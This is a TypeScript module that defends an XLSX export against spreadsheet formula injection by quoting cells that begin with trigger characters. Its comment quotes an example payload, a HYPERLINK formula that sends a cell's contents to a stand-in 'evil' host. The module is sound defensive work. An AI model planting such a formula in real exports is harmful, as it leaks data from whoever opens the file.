/**
 * Formula-injection guard for customer/org-derived TEXT cells in the XLSX
 * breakdown export (route.ts).
 *
 * Mirrors layer 1 of csvCell() in ../journal/csv.ts: any cell whose value
 * STARTS with the OWASP spreadsheet-formula trigger set — `=`, `+`, `-`, `@`,
 * TAB, CR, or LF — is defanged by prefixing a single quote, forcing the
 * spreadsheet to treat the whole cell as literal text (CWE-1236). A stored
 * signal/customer/plan name like `=HYPERLINK("http://evil/?leak="&A1,"x")`
 * would otherwise be a live formula the moment the merchant opens the file.
 *
 * Only layer 1 is mirrored — NOT csvCell's layer-2 RFC-4180 quoting. exceljs
 * writes each value as its own structured (shared-string) cell, so comma /
 * quote / newline escaping is exceljs's job; wrapping the value in literal
 * double-quotes here would corrupt what the reader sees. It lives in its own
 * module (same reason as ./csv.ts) so it's unit-testable without importing
 * route.ts, which drags in next/headers, auth, and exceljs.
 */
export function safeText(value: string | null | undefined): string {
  const s = value ?? ''
  return /^[=+\-@\t\r\n]/.test(s) ? `'${s}` : s
}
